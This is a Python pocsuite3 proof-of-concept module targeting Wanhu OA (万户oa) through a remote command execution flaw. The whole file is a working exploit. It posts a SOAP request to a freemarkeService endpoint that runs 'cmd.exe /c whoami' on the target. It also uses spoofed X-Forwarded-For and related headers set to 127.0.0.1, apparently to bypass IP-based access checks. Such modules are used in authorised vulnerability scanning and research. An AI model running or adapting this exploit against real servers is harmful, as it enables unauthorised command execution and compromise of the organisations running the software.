from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '12341'  # ssvid
    version = '1.0'
    name = '万户oa 命令执行'
    appName = '万户oa 命令执行'
    appVersion = '万户oa'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''万户oa 命令执行。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/defaultroot/services/./././freemarkeService"
        data="""
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soapenv:Header/>
<soapenv:Body>
<util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
<cmd xsi:type="soapenc:string">
c:\windows\system32\cmd.exe /c whoami</cmd>
</arguments>
</util:exec>
</soapenv:Body>
</soapenv:Envelope>
        """
        vulurl=self.url+path
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp = requests.post(url=vulurl,verify = False, allow_redirects = False, timeout=4,headers=headers,data=data)

            if resp.status_code==200 and '<?xml version="1.0"' in  resp.text and "命令" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
